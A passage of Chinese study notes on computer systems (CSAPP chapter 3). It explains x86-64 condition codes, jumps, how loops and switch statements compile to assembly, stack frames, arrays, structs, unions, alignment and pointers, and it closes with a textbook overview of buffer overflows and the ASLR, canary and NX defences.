1</code>就代表小于或者等于。</p></li><li><p>分析<code>setge</code>。既然SF^OF = 1代表小于，那么整体取反后，<code>~(SF^OF) = 1</code>，就代表大于等于。（小于的反面就是大于等于）</p></li><li><p>分析<code>setg</code>。既然<code>(SF^OF) | ZF = 1</code>就代表小于等于，那么整体取反后，<code>~(SF^OF) &amp; ~ZF = 1</code>（注意取反后或符号变为与符号），就代表大于。</p></li></ol></blockquote><p><code>SET</code>指令的目的操作数是低位单字节寄存器元素之一，或是一个字节的内存位置，指令会将这个字节设置成 0 或者 1 。为了得到一个 32 位或者 64 位结果，我们必须对高位清零。</p><img src="https://s2.loli.net/2022/03/08/9PCte218qMvHW3j.png" style="zoom:80%;" /><p>对于无符号数比较来说其进行比较时使用的是惊为标志和零标志的组合。大多情况下机器代码对有符号和无符号的运算中的两种情况都是使用一样的指令，因为许多算术运算对无符号和补码算术都有一样的位级行为，而对于右移、除法、乘法时使用的指令和条件码不相同。</p><h3 id="跳转指令">跳转指令</h3><p><code>JMP</code>：无条件跳转，跳转目标从寄存器或者内存位置读出。</p><blockquote><p>直接跳转是给出一个标号作为跳转目标的，而间接跳转是<code>*</code>后面跟一个操作数指示符。</p><p><code>jmp *%rax</code>：用寄存器<code>%rax</code>中的中的值作为跳转目标</p><p><code>jmp *(%rax)</code>：以寄存器<code>%rax</code>中的值作为读地址，从内存中读出跳转目标。</p></blockquote><img src="https://s2.loli.net/2022/03/09/OglYsqIVU8MiADB.png" style="zoom:67%;" /><p>在实现跳转时，目的跳转地址可以通过指令的字节码来计算，目的跳转地址是本行对应 16 进制数据加上下一行指令的地址的和得到对应的跳转地址。举个例子：</p><p><img src="https://s2.loli.net/2022/03/09/XQeoU23KPLhgA1v.png" alt=""></p><p>通过如此计算 ( 相对寻址 ) ，程序计数器的值是跳转指令后面的那条指令的地址，而不是跳转指令本身的地址。</p><p>在寻址计算时如果出现了负数时，我们利用<strong>补码等于源码取反加一</strong>的方式来计算所需要减去的值的大小，以上图为例子 <code>f8</code> 的二进制位是<code>1111 1000</code>我们对其求补码可以得到<code>0000 1000</code>此时值为 8 ，那么下一条指令的地址减去该值便是所跳转到的地址。</p><blockquote><p>举个例子：</p><p><img src="https://s2.loli.net/2022/03/10/fnQBDeZ5wdCilHm.png" alt=""></p><p>有题目可以知道这个是一个小端序的字节顺序，所以在读取数据时是从右往左进行读取，我们可以看到其为一个负数，而求其跳转地址，我们已知<code>跳转地址=操作数+下一条指令的地址</code>，那么求这个跳转的地址我们可以用两种方式来求解。</p><p>方式一</p><p>我们直接拿<code>4005ed</code>减去<code>0x73</code>可以得到<code>400560</code>，而这个数据也便是我们跳转到的地址。</p><p>方式二</p><p>我们将<code>ff ff ff 73</code>的二进制位列出来可以看到<code>1111 1111 1111 1111 1111 1111 0111 0011</code>，我们对其取反可以得到<code>1000 1100</code>将其转换为 16 进制数据可以得到<code>0x8C</code>我们再对取反后的数据加一，可以得到其补码，便是<code>0x8D</code>我们此时将下一条指令的地址减去对应的补码便可以得到我们跳转到的地址，即<code>400560</code></p></blockquote><h3 id="条件分支">条件分支</h3><p>在<code>C</code>中我们实现一个<code>if - else</code>的分支结构采用如下方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(test-expr)&#123;<br>then-statement<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">else</span>-statement<br>&#125;<br></code></pre></td></tr></table></figure><p>但是在汇编语言中其会转变为<code>goto</code>语句来进行分支，来确保不会执行到错误的部分，上述的<code>C</code>代码转换为汇编模式则是（ 我们以C语法描述控制流 ）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">t=test-expr;<br><span class="hljs-keyword">if</span>(!t)<br><span class="hljs-keyword">goto</span> <span class="hljs-literal">false</span>;<br>then-statement<br><span class="hljs-keyword">goto</span> done;<br><span class="hljs-literal">false</span>:<br><span class="hljs-keyword">else</span>-statement<br>done:<br></code></pre></td></tr></table></figure><p>也就是汇编器为<code>then-statement</code>和<code>else-statement</code>产生各自的代码块。它会插入条件和无条件分支，来确保执行正确的命令。</p><p>上述实现条件操作是一种传统简单但低效的一种方式，在现代处理器上，常常以条件传送来实现，我们同样举出相应的例子来看：</p><img src="https://s2.loli.net/2022/03/10/XC2vSiQRVpB8DxA.png" style="zoom:80%;" /><p>需要注意的是：使用条件赋值时不会改变<code>lt_cnt</code>或<code>ge_cnt</code>的值，其只是简单地计算函数要返回的值。</p><hr><p>对于分支预测错误的处罚计算：</p><p>假设计算错误的概率是<code>p</code>，如果没有预测错误，执行代码的时间是$T_{ok}$,而预测错误==的处罚是 $T_{MP}$，模式为随机是执行所需要的时间周期为 $T_{ran}$,模式为非常可预测时执行所需要的时间周期为 $T_{OK}$，则有关系式：$T_{MP}  = 2\ ( T_{ran} - T_{OK} )$</p><p>即函数需要的时间范围大约是：$T_{OK}\ \  —\ \  T_{OK} + T_{MP}$</p><hr><img src="https://s2.loli.net/2022/03/10/ftHrC5IiGudzap3.png" style="zoom:80%;" /><p>条件传送中，处理器无需预测测试的结果就可以执行条件攒送。处理器只是读源值 (可能是从内存中)，检查条件码，然后要么更新目的寄存器，要么保存不变。</p><h3 id="循环分支">循环分支</h3><h4 id="do-while">do-while</h4><p>一般来说在汇编中会将循环变成低级的测试和条件跳转的组合，以<code>do-while</code>为例：</p><img src="https://s2.loli.net/2022/03/12/Up79qhHjelyVv5s.png" style="zoom:80%;" /><p>可以看出在汇编里采用了条件跳转和低级测试实现的一个<code>do-while</code>循环，最为关键的便是第 7 汇编语句，其决定了是否继续重复和退出循环。</p><h4 id="while">while</h4><p><code>while</code>与<code>do-while</code>不同的是<code>while</code>可能一次循环都不会执行，而<code>do-while</code>至少执行一次，对此我们需要先进行测试然后再跳转到对应的循环体里，<code>GCC</code>在生成<code>while</code>循环时常使用两种翻译方式：</p><ul><li><p>跳转到中间</p><p>通常的模板形式是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">goto</span> test;<br> loop:<br>body-statement<br> test:<br>t = test-expr;<br>   <span class="hljs-keyword">if</span>(t)<br>   <span class="hljs-keyword">goto</span> loop;<br></code></pre></td></tr></table></figure></li></ul><p>可以看到程序先跳转到的是测试循环成立与否的条件判断处，然后判断成立时再次进行跳转。</p><img src="https://s2.loli.net/2022/03/12/eMcd7rtpNUqL84o.png" style="zoom:80%;" /><ul><li><p>条件分支</p><p>第二种方式是采用判断条件是否成立，如果不成立则直接跳过循环，把代码转换为<code>do-while</code>循环。大致可以表示成如下形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">t = test-expr;<br><span class="hljs-keyword">if</span>(!t)<br><span class="hljs-keyword">goto</span> done;<br><span class="hljs-keyword">do</span> <br>body-<span class="hljs-function">statement</span><br><span class="hljs-function"><span class="hljs-title">while</span> <span class="hljs-params">(test-expr)</span></span>;<br>done:<br></code></pre></td></tr></table></figure><p>相应的还可以翻译成<code>goto</code>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">t = test-expr;<br><span class="hljs-keyword">if</span>(!t)<br><span class="hljs-keyword">goto</span> done;<br>loop: <br>body-statement<br>t = test-expr;<br>  <span class="hljs-keyword">if</span>(t)<br>  <span class="hljs-keyword">goto</span> loop;<br>done:<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/03/12/tpsXLCgUcyuo8AF.png" style="zoom:80%;" /></li></ul><p><img src="https://s2.loli.net/2022/03/12/4X8MrqzUT6fShIu.png" alt=""></p><h4 id="for">for</h4><p><code>for</code>循环的行为与<code>while</code>比较相似，<code>for</code>的通用形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (init-expr; test-expr; update-expr)<br>body-statement<br></code></pre></td></tr></table></figure><p>对此转换成<code>while</code>可以如下表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">init-expr;<br><span class="hljs-keyword">while</span> (test-expr)&#123;<br>body-statement<br>update-expr;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序会先对初始表达式进行求值，然后进入循环，进行测试表达式的结果来判断是否执行循环内容。</p><p>由于<code>for</code>在编译时与<code>while</code>效果相似，在编译成汇编时，会根据优化程度来采用<code>while</code>的两个方式之一来进行转换。</p><h4 id="小总结">小总结</h4><p><code>C语言</code>中的三种形式的循环都可以采用简单的策略来进行翻译，以条件分支和逻辑判断来实现，产生包含一个或多个条件分支的代码。控制的条件转移提供了将循环翻译成机器代码的基本机制。</p><h4 id="switch">switch</h4><p><code>switch</code>更具一个整数索引值进行多重分支，同时可以通过跳转表 ( 一个数组 ) 来使其更加高效。[ 一般在开关情况过多时 ( 4 个以上 )，并且值的范围跨度比较小时采用跳转表 ] 。</p><p><img src="https://s2.loli.net/2022/03/12/DkTHhPFrw7f16aB.png" alt=""></p><p>在上图中我们可以看到在跳过一个不连续的区域时在对应的跳转表里所对应的是<code>default</code>区段，会在对应指向执行<code>def</code>的代码段。</p><blockquote><p>&amp;&amp; 创建一个指向代码位置的指针</p></blockquote><p>同时可以注意到上面代码段有一个对<code>index &gt; 6</code>的判断语句，这个是干什么的呢？我们试想一个补码表示的负数会被映射成一个无符号的最正大数，利用这个减少了分支的可能性。转换为汇编则为如下形式：</p><img src="https://s2.loli.net/2022/03/12/p21MT3EPUqGhHfv.png" style="zoom:80%;" /><p>上述代码的关键是第 16 行的<code>goto</code>跳转语句，转换为汇编便是第 5 行的<code>jmp</code>语句，采用间接跳转来实现，操作数指定一个内存位置，由寄存器<code>%rsi</code>给出，这个寄存器保存着<code>index</code>的值。在跳转表中重复的便是打上相同标号，而对于确实则是采用<code>def标号</code>跳转到对应的<code>default</code>块进行处理。</p><blockquote><p><img src="https://s2.loli.net/2022/03/12/JocSDwCMUfOAE5t.png" alt=""></p><p>而寻找多个标号的下标只需要对照后面的<code>L X</code>进行查找，可看到<code>case 2</code>和<code>case 4</code>、<code>case 0</code>和<code>case 7</code>的情况标号相同。</p><p>我们以练习题 <code>3.31</code>的练习题为例，可以根据给出的汇编代码和其相应的跳转表，写出对应的<code>C代码</code>：</p><img src="https://s2.loli.net/2022/03/12/jER3iozOJVflDdL.png" style="zoom:80%;" /><p>对应转换出来的<code>C语言</code>代码为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">switcher</span><span class="hljs-params">(<span class="hljs-keyword">long</span> a,<span class="hljs-keyword">long</span> b,<span class="hljs-keyword">long</span> c,<span class="hljs-keyword">long</span>* dest)</span></span>&#123;<br><span class="hljs-keyword">long</span> val;<br><span class="hljs-keyword">switch</span>(a)&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>c = b ^ <span class="hljs-number">15</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>val = c + <span class="hljs-number">112</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>val = (b+c)*<span class="hljs-number">4</span>;<span class="hljs-comment">//(b+c)&lt;&lt;2</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>val = b ;<br>&#125;<br>*dest = val;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h3 id="栈">栈</h3><p>在<code>x86-64</code>中栈空间向低地址方向增长，同时当<code>x86-64</code>过程需要的存储空间超出寄存器能够存放的大小时，就会在栈上分配空间，这个部分称为过程的栈帧。</p><img src="https://s2.loli.net/2022/03/21/SBEMHFcLKa38tnp.png" style="zoom:80%;" /><p>当过程<code>P</code>调用过程<code>Q</code>时，会把返回的地址压入栈中，指明当<code>Q</code>返回时，要从<code>P</code>的程序的哪个位置继续执行。我们把返回地址也当作<code>P</code>的栈帧的一部分，因为其存放的是于<code>P</code>相关的状态。而<code>Q</code>代码部分会扩展当前栈的边界，分配其栈帧所需要的空间大小。</p><blockquote><p>简单来说，当<code>S</code>要调用<code>Q</code>函数时，会先将下一条命令的地址压入栈中，并保存相关寄存器的值，然后将<code>Q</code>函数的栈帧压入</p><p>以下图为例，有如下执行顺序：</p><img src="https://s2.loli.net/2022/03/21/5R1M9OJKu4e7aFt.png" style="zoom:67%;" /></blockquote><p>在上述的调用过程中大部分的数据传送是通过寄存器完成的，当<code>P</code>调用<code>Q</code>时，<code>P</code>的代码必须先把参数复制到适当的寄存器中，同样的当<code>Q</code>返回到<code>P</code>时，<code>P</code>的代码可以从<code>%rax</code>中取得返回值。</p><img src="https://s2.loli.net/2022/03/21/Z3qogs5GdUPp8l2.png" style="zoom:80%;" /><p>在<code>x86-64</code>中可以通过寄存器最多传递 6 个整型( 例如整数和指针)参数。当一个函数有大于 6 个整型参数时，超过的部分便需要通过栈来进行传递。同时通过栈来传递参数时，所有数据都向 8 的倍数对齐，当参数到位的时候程序便可以通过<code>call</code>指令来将控制转移到<code>Q</code>。</p><p>存放在局部变量的值不需要进行字节对齐，而当值被当作参数传入到函数中时，便需要进行字节对齐。</p><blockquote><img src="https://s2.loli.net/2022/03/21/s4e8yZlx5wNcJtT.png" style="zoom:80%;" /><p>可以看到<code>1-6</code>的参数值都是通过寄存器传递而多出来的<code>7-n</code>的参数便是在栈顶以 8 的倍数进行压入。</p></blockquote><p>有些时候局部数据必须放在内存中，包括如下情况：</p><ul><li>寄存器不足存放所有的本地数据</li><li>对一个局部变量使用<code>&amp;</code>，因此必须能够为它产生一个地址。</li><li>某些局部变量是数组或者结构，因此必须能通过数组或结构引用被访问到。</li></ul><blockquote><p>栈指针加上某一个数值代表着栈的缩减，而压入数据的时候栈顶指针进行减数值，栈空间向上移动。</p></blockquote><p>寄存器是唯一被所有过程共享的资源，虽然是在给定时刻只有一个是活动的但是，我们仍然需要确保一个过程调用另一个过程的时候时，被调用者不会覆盖调用者稍后使用的寄存器的值。</p><p>寄存器<code>%rbp</code>、<code>%rbx</code>和<code>%r12 - %r15</code>被划分为<strong>被调用者保存寄存器</strong>，除了栈指针<code>%rsp</code>都分类为<strong>调用者保存器</strong>。</p><img src="https://s2.loli.net/2022/03/22/59hnlpNxe2DSkgF.png" style="zoom:80%;" /><p>通过上述例子，可以更好的理解到程序在调用栈的过程中是如何对寄存器的操作的。值得注意的是最后恢复原来的数据的时候是先弹出<code>%rbx</code>再弹出<code>%rbp</code>，体现出栈的先进后出的原则。</p><blockquote><p>下面以习题 3 .34 为例：</p><p>一个函数<code>P</code>生成名为<code>a0 ~ a7</code>的局部变量然后调用函数<code>Q</code></p><p><img src="https://s2.loli.net/2022/03/22/KqiZ4rxfXYydRp7.png" alt=""></p><p>从汇编来看我们可以知道在<code>x86-64</code>中可以通过寄存器最多传递 6 个整型，所以<code>a0</code>到<code>a5</code>共 6 个变量是保存在寄存器中的，而<code>a6</code>和<code>a7</code>存储在栈空间里面，对于程序而言，不能把所有变量均存储在寄存器上是因为寄存器不够用，因而无法存取。</p></blockquote><h4 id="递归调用">递归调用</h4><img src="https://s2.loli.net/2022/03/23/kBP9o86WlVGivSd.png" style="zoom:80%;" /><p>汇编使用寄存器<code>%rbx</code>来进行保存参数<code>n</code>，先把已有的值保存在栈上( 第二行 )，随后在返回前恢复该值( 第十一行)。根据栈的使用特性和寄存器保存规则，可以保证当递归调用<code>rfact(n-1)</code>返回时( 第九行 )：</p><ul><li>该次调用的结果会保存在寄存器<code>%rax</code>中</li><li>参数<code>n</code>的值仍然在寄存器<code>%rbx</code>中</li></ul><p>递归调用对程序的栈空间消耗十分大，如果程序中对递归调用的次数过大时，可能会引发溢出。</p><h3 id="数组">数组</h3><p>通常来说对于一个数组的引用可以通过内存引用的方式来进行简化数组的访问，如果有一个<code>int E[i]</code>，<code>E</code>的地址存放在寄存器<code>%rdx</code>中，而<code>i</code>存放在寄存器<code>%rcx</code>中时，可以利用指令<code>movl (%rdx,%rcx,4),%eax</code>也就是取出<code>%rdx</code>向下<code>4 * %rcx + %rdx</code>的内存位置的值，同理于取出其他数据。而对于引用了指针的数据也是可以进行如上的过程。</p><p><img src="https://s2.loli.net/2022/03/23/toQ12rNWUByzhRq.png" alt=""></p><blockquote><p>需要注意的是，对数组的地址进行访问也要乘以字节数</p></blockquote><p>对于多维的数组时，其值时保存在栈空间内部，我们依然可以把其理解为一个线性的空间，同样的可以通过对其地址空间的偏移来取其值。</p><p><img src="https://s2.loli.net/2022/03/23/KhO4kSbe6uaAxiE.png" alt=""></p><p>通常要访问多维度的元素，编译器会以数组起始为基地址，然后以偏移量为索引，产生期望的元素偏移量，然后使用对应的<code>mov</code>指令。对于如下声明的一个数组：<code>T D[R][C]</code>，其数组元素<code>D[i][j]</code>的内存地址为$$&amp;D[i][j] = x_D+L(C*i+j)$$。</p><h4 id="定长数组">定长数组</h4><p><code>C语言</code>编译器能优化定长多维数组上的操作代码。编译器可能会去除整数索引，转换为指针间接引用，于此编译器还可能采用某个指针指向对应数组的固定部分，在后续的运算中在这个指针上进行如下图所示</p><img src="https://s2.loli.net/2022/03/23/xRl8DqLgWnItUK4.png" style="zoom:80%;" /><p>可以看出来<code>GCC</code>生成了一个指针，命名为<code>Aptr</code>指向<code>A</code>的行<code>i</code>中连续的元素，也生成了一个指针，命名为<code>Bptr</code>指向<code>B</code>的列<code>k</code>中连续的元素，利用指针来对其进行运算，同时省去对变量<code>j</code>的定义过程，利用判别式来判断函数停止的条件。</p><h4 id="变长数组">变长数组</h4><p>定义变长数组时不得不用<code>malloc</code>或者<code>calloc</code>函数进行分配存储空间，而不得不显示地编码，用行优先索引将多维数组映射到一维数组，但是在<code>ISOC99</code>允许数组的维度是一个表达式，在数组分配的时候才计算出来。我们声明一个数组<code>A[expr1][expr2]</code>，我们访问该元素的<code>A[i][j]</code>可以编写如下的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">var_ele</span><span class="hljs-params">(<span class="hljs-keyword">long</span> n,<span class="hljs-keyword">int</span> A[n][n],<span class="hljs-keyword">long</span> i,<span class="hljs-keyword">long</span> j)</span></span>&#123;<br><span class="hljs-keyword">return</span> A[i][j];<br>&#125;<br></code></pre></td></tr></table></figure><p>则在变长数组中会产生如下汇编代码：</p><p><img src="https://s2.loli.net/2022/03/23/fkLiIswK2CHEqV6.png" alt=""></p><p>而在<code>GCC</code>的优化下会变成如下：</p><img src="https://s2.loli.net/2022/03/23/6gwsVnRQ9LUJjCH.png" style="zoom:80%;" /><p>将优化后的<code>C代码</code>进行转换为汇编时程序会采取上述方式对数组进行取值保存，利用指针的变化改变其取值的偏移量，进而进行优化其结构。</p><p><img src="https://s2.loli.net/2022/03/23/EmefX2hib9WVtlD.png" alt=""></p><p><img src="https://s2.loli.net/2022/03/23/B2by317m6NlJQGp.png" alt=""></p><h3 id="结构体">结构体</h3><p>结构体可以将多个不同数据组合在一起，与多维数组相似，其在栈空间上是线性存储的，于是我们也可以通过其首地址加上对应的偏移量来取到对应的结构体数据。</p><p>我们声明一个结构体变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rec</span>&#123;</span><br><span class="hljs-keyword">int</span> i;<br><span class="hljs-keyword">int</span> j;<br><span class="hljs-keyword">int</span> a[<span class="hljs-number">2</span>];<br><span class="hljs-keyword">int</span> *p;<br>&#125;;<br></code></pre></td></tr></table></figure><p>则其对应的空间分配为如下图：</p><p><img src="https://s2.loli.net/2022/03/23/ditkbVOu3TUIsAj.png" alt=""></p><p>假设<code>r</code>存储在寄存器<code>%rdi</code>时，如果我们需要取出<code>i</code>的值时可以直接用偏移量进行取值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movl(%rdi),%eax;r-&gt;i<br>movl4(%rdi),%eax;r-&gt;j<br></code></pre></td></tr></table></figure><p>而对于存储在结构体中的数组我们可以利用偏移量对其进行取值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;r in %rdii in %rsi<br>leaq8(%rdi,%rsi,4),%rax; Set %rax to &amp;r-&gt;a[i] <br></code></pre></td></tr></table></figure><p>如果我们要实现<code>r-&gt;p = &amp;r-&gt;a[r-&gt;i + r-&gt;j]</code>时，也可以l向上述过程中一样将<code>r-&gt;i</code>和<code>r-&gt;j</code>的和相加得到一个偏移量，将结构体的首地址值加上对应的字节长度(<code>r-&gt;i + r-&gt;j</code>)和数据<code>a</code>的字节长度乘以相应长度值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;r in %rdi<br>movl4(%rdi),%eax; Get r-&gt;j<br>addl(%rdi),%eax; Add r-&gt;i<br>cltq    ; Extend to 8 bytes<br>leaq8(%rdi,%rax,4),%rax; Compute &amp;r-&gt;a[r-&gt;i + r-&gt;j]<br>movq%rax,16(%rdi); Store in r-&gt;p<br></code></pre></td></tr></table></figure><blockquote><p>下面以一个结构体为例：</p><p><img src="https://s2.loli.net/2022/03/23/srxG19DImnp5gzL.png" alt=""></p></blockquote><h3 id="联合">联合</h3><p><code>union</code>与结构体不同，其在栈上分配的空间是定义变量中最大的一个，当在<code>union</code>中进行嵌套多个结构体时，如果需要对某一个结构体中的变量进行调用时，其余的结构体变量则会不占用对应的空间，而<code>union</code>对应的首地址也变成对应调用结构体的首地址。有如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">a</span>&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a0</span>&#123;</span><br><span class="hljs-keyword">int</span> a;<br>         <span class="hljs-keyword">int</span> b;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a1</span>&#123;</span><br><span class="hljs-keyword">int</span> c;<br><span class="hljs-keyword">int</span> d;<br>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>当我们需要对<code>a1</code>中的<code>c</code>调用时，此时共用体<code>a</code>的首地址变成嵌套结构体<code>a1</code>中<code>c</code>的地址，其偏移量为 0 ，调用<code>a1</code>中<code>d</code>的话其对应的偏移量为 4 。</p><h3 id="数据对齐">数据对齐</h3><p>许多计算机系统对基本数据类型的合法地址做出了一些吸纳之，要求某种类型对象的地址必须值<code>K</code>(通常是 2 、4、8 )的倍数。这种方式产生相应的字节对齐必须是<code>K</code>的倍数。在汇编中会出现如下指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.align 8<br></code></pre></td></tr></table></figure><p>表示后面的数据会遵循 8 字节的对其长度，而对于结构体，也会在其中进行插入间隙来完成对应的字节对齐。<strong>整个结构体的对齐值一般是结构体中最大数据类型所占的空间</strong>。与此如果一个类型按n字节对齐，那么该类型的变量起始地址必须是n的倍数。</p><p>如果一个结构体变量中最后一个数据不满足字节对齐时编译器也会对其进行补齐，而补齐的空间也造成了内存浪费。</p><h3 id="指针">指针</h3><p>指针是<code>C语言</code>中的一个核心特色，以一种统一的方式对不同数据结构中的元素产生引用。</p><ul><li>每一个指针都对应一个类型，表明指针指向的是哪一类对象</li><li>每一个指针都有一个值。这个值是某个指定类型的对象地址。特殊的<code>NULL( 0 )</code>表示该指针没有指向任何地方。</li><li>指针用<code>&amp;</code>运算符创建，<code>leaq</code>指令是设计用来计算内存引用的地址的，<code>&amp;</code>运算符的机器代码实现存储用这个指令来计算表达式的值。</li><li><code>*</code>操作符用于间接引用指针，结果是一个值，间接引用时用内存引用来实现的，要么存储到一个指定的地址，要么时从指定的地址读取。</li><li>指针的强制转换只改变类型不改变值，相当于在指向的时候偏移量发生了变换。如表达式<code>(int *)p + 7</code>则会计算为：<code>p + 28</code></li><li>指针可以指向函数，来对其进行调用。</li></ul><h4 id="GDB">GDB</h4><img src="https://s2.loli.net/2022/03/28/EFg4QNnPiv5Tql2.png"  /><h3 id="内存越界引用和缓冲区溢出">内存越界引用和缓冲区溢出</h3><p><code>C</code>对于数组引用不做任何边界检查，而且局部变量和状态信息( 例如保存的寄存器值和返回地址 )都存放在栈中。这两种情况结合到一起就引发严重的程序错误，对越界的数组元素的写操作会破坏存储在栈中的状态信息。当程序使用这个破坏的状态，试图重新加载寄存器或者执行<code>ret</code>时，会发生严重的错误。( PWN 中<code>ret2</code>漏洞 )</p><p>缓冲区溢出时如果覆盖了返回地址值，那么程序会跳转到对应的地址值处，而不是返回到原来的地址上去，因此可能执行不愿意执行的函数，而引发错误。</p><h3 id="对抗缓冲区溢出">对抗缓冲区溢出</h3><h4 id="栈随机化-ASLR">栈随机化(ASLR)</h4><p>为了在系统中插入攻击代码，攻击者及需要插入代码也需要插入指向这段代码的指针，这个指针也是攻击字符传递一部分。产生这个指针需要知道这个字符串放置的栈地址，而栈随机化在程序开始时，在栈上分配<code>0 ~ n</code>字节之间的随机大小的空间，入使用分配函数<code>alloca</code>在栈上分配指定字节数量的空间，程序并不使用这段空间，但是它会导致程序每次执行的时候栈的地址空间进行了变化，分配的<code>n</code>必须足够打，才能获得足够多的栈地址变化，但也要足够小，避免浪费程序过多的空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">long</span> local;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;local at %p\n&quot;</span>,&amp;local);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上述程序中，仅仅只是输出对应的<code>main</code>的地址，但是每次执行时发现输出并不一样，则证明开启了栈地址随机化。</p><p>对于这种防护，攻击者可以在实际攻击的代码前加入很长一段的<code>nop</code>，只要攻击者猜中了这段序列中的某个地址程序就会经过这个序列，到达攻击代码。这个序列常常被称作“空操作雪橇”。</p><blockquote><p>破解的随机化大小  =  枚举的地址长度   *   <code>nop sled</code>长度</p><p>尝试穷尽起始地址次数  =  地址范围  /  <code>nop sled</code>长度</p><p>其中需要保证已经在栈上插入了攻击代码，于此再在栈顶上加入对应的随机化长度的 <code>nop</code></p></blockquote><h4 id="栈破坏检测-Canary">栈破坏检测(Canary)</h4><p>其思想是在栈帧中任何局部缓冲区于栈状态之间存储一个特殊的<code>Canary</code>值，其大小是程序每次运行时随机产生的，程序会对这个值进行检查，如果被某个操作数或者函数改变时会引发异常导致程序终止。</p><p><img src="https://s2.loli.net/2022/03/28/s8XJyunKEHNf91Z.png" alt=""></p><p>对于这个的绕过则需要将溢出的数据在<code>Canary</code>处将其还原，然后覆盖到后面的数据。实现溢出。</p><h4 id="限制可执行代码区域-NX">限制可执行代码区域(NX)</h4><p>在典型的程序中，只有保存编译器产生的代码的那部分内存才需要是可执行的，其他部分限制为只允许读和写。而<code>NX</code>将读和写的模式进行分开，将栈变为可读可写但是不可执行，减少了损失效率。</p><h3 